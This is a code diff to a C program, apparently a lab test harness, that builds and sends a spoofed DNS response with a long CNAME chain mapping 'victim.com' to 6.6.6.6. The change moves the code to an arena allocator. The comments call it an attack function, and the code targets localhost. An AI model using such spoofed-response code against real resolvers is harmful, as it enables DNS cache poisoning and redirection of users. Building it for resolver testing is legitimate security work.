@@ -18,7 +18,7 @@
  *   -> a54.longchain.com. CNAME final-target.com.
  *   -> final-target.com. A 1.2.3.4
  */
-static void send_long_cname_chain_response(int sockfd, char *src_ip, char *dst_ip, uint16_t dst_port,
+static void send_long_cname_chain_response(Arena* arena, int sockfd, char *src_ip, char *dst_ip, uint16_t dst_port,
                                            char *query_domain, char *final_a_record_ip)
 {
 
@@ -29,7 +29,7 @@ static void send_long_cname_chain_response(int sockfd, char *src_ip, char *dst_i
     struct dns_answer *answers[CNAME_CHAIN_LENGTH + 1];
 
     // 第一个问题部分
-    query[0] = new_dns_query_a(query_domain);
+    query[0] = new_dns_query_a(arena, query_domain);
 
     // 构建CNAME链
     char current_domain[256];
@@ -42,17 +42,17 @@ static void send_long_cname_chain_response(int sockfd, char *src_ip, char *dst_i
     {
         snprintf(current_domain, sizeof(current_domain), "a%d.longchain.com", i);
         snprintf(next_domain, sizeof(next_domain), "a%d.longchain.com", i + 1);
-        answers[i] = new_dns_answer_cname(current_domain, next_domain, 3600);
+        answers[i] = new_dns_answer_cname(arena, current_domain, next_domain, 3600);
     }
 
     // 最后一个CNAME记录，指向最终的A记录域名
     // a(N).longchain.com CNAME final-target.com
     snprintf(current_domain, sizeof(current_domain), "a%d.longchain.com", CNAME_CHAIN_LENGTH - 1);
-    answers[CNAME_CHAIN_LENGTH - 1] = new_dns_answer_cname(current_domain, "final-target.com", 3600);
+    answers[CNAME_CHAIN_LENGTH - 1] = new_dns_answer_cname(arena, current_domain, "final-target.com", 3600);
 
     // 最终的A记录
     // final-target.com A 1.2.3.4
-    answers[CNAME_CHAIN_LENGTH] = new_dns_answer_a("final-target.com", inet_addr(final_a_record_ip), 3600);
+    answers[CNAME_CHAIN_LENGTH] = new_dns_answer_a(arena, "final-target.com", inet_addr(final_a_record_ip), 3600);
 
     printf("[*] DNS records for CNAME chain created.\n");
 
@@ -92,20 +92,10 @@ static void send_long_cname_chain_response(int sockfd, char *src_ip, char *dst_i
     printf("[*] Sending a single spoofed response with CNAME chain...\n");
 
     // 调用你实现了分片逻辑的send_udp_packet
-    send_udp_packet(sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
+    send_udp_packet(arena, sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                     53, dst_port);
 
     printf("[*] Packet sent.\n");
-
-    // --- 5. 清理内存 ---
-    // cleanup:
-    free(packet_raw);
-    free(dns_payload);
-    free_dns_query(query[0]);
-    for (int i = 0; i < CNAME_CHAIN_LENGTH + 1; ++i)
-    {
-        free_dns_answer(answers[i]);
-    }
 }
 
 // 在你的某个攻击函数或者main函数中
@@ -115,7 +105,7 @@ int main(int argc, char** argv) {
         
     char* src_ip = "127.0.0.1";
     char* target_ip = "127.0.0.1";
-    uint16_t target_port = 31337;
+    uint16_t target_port = 12345;
     char* queried_domain = "victim.com";
     char* final_ip = "6.6.6.6";
 
@@ -126,9 +116,10 @@ int main(int argc, char** argv) {
     }
 
     // 调用测试函数
-    send_long_cname_chain_response(sockfd, src_ip, target_ip, target_port,
+    Arena arena = {0};
+    send_long_cname_chain_response(&arena, sockfd, src_ip, target_ip, target_port,
                                    queried_domain, final_ip);
-
+    arena_free(&arena);
     close(sockfd);
     
     printf("Test finished.\n");
